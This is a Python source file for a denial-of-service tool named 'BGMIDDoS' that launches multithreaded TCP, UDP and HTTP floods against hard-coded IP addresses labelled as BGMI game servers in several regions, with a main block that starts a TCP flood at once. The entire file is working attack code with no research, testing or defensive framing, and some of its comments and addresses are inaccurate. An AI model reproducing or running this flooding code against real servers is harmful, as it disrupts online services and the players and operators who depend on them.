import socket
import threading
import time
import random
import requests
import json

class BGMIDDoS:
    def __init__(self):
        self.attack_active = False
        self.threads = []
        self.bgmi_servers = [
            "45.76.156.194",  # Asia server
            "103.21.244.0",   # India server
            "103.22.200.0",   # Middle East
            "45.76.156.195",  # Europe
            "45.32.100.25",   # North America
            "45.76.156.196",  # South America
        ]
        
    def generate_fake_ip(self):
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    def tcp_flood(self, target_ip, target_port=80, duration=60):
        """TCP flood attack on BGMI server"""
        timeout = time.time() + duration
        while time.time() < timeout and self.attack_active:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target_ip, target_port))
                
                # Send garbage data
                s.send(b"GET / HTTP/1.1\r\n")
                s.send(b"Host: " + target_ip.encode() + b"\r\n")
                s.send(b"User-Agent: Mozilla/5.0\r\n")
                s.send(b"Accept: */*\r\n")
                s.send(b"Connection: keep-alive\r\n\r\n")
                
                # Send more random packets
                for _ in range(50):
                    s.send(random._urandom(1024))
                
                s.close()
            except:
                pass
    
    def udp_flood(self, target_ip, target_port=3074, duration=60):
        """UDP flood - common for game servers"""
        timeout = time.time() + duration
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        while time.time() < timeout and self.attack_active:
            try:
                # Send random UDP packets
                data = random._urandom(1490)  # Max UDP packet size
                sock.sendto(data, (target_ip, target_port))
                sock.sendto(data, (target_ip, target_port + 1))
                sock.sendto(data, (target_ip, target_port + 2))
            except:
                pass
    
    def http_flood(self, target_url, duration=60):
        """HTTP GET flood"""
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive'
        }
        
        timeout = time.time() + duration
        while time.time() < timeout and self.attack_active:
            try:
                requests.get(target_url, headers=headers, timeout=2)
                requests.get(target_url + "/api/v1/login", headers=headers, timeout=2)
                requests.get(target_url + "/game/server", headers=headers, timeout=2)
            except:
                pass
    
    def start_attack(self, target_type="tcp", threads=500, duration=300):
        """Start DDoS attack"""
        self.attack_active = True
        self.threads = []
        
        target = random.choice(self.bgmi_servers)
        
        print(f"[+] Starting {target_type.upper()} attack on BGMI server: {target}")
        print(f"[+] Threads: {threads}, Duration: {duration}s")
        
        for i in range(threads):
            if target_type == "tcp":
                thread = threading.Thread(target=self.tcp_flood, args=(target, 80, duration))
            elif target_type == "udp":
                thread = threading.Thread(target=self.udp_flood, args=(target, 3074, duration))
            elif target_type == "http":
                thread = threading.Thread(target=self.http_flood, args=(f"http://{target}", duration))
            
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
        
        time.sleep(duration)
        self.stop_attack()
    
    def stop_attack(self):
        """Stop all attacks"""
        self.attack_active = False
        for thread in self.threads:
            if thread.is_alive():
                thread.join(timeout=1)
        print("[!] Attack stopped")

# Quick test
if __name__ == "__main__":
    ddos = BGMIDDoS()
    ddos.start_attack("tcp", threads=100, duration=10)
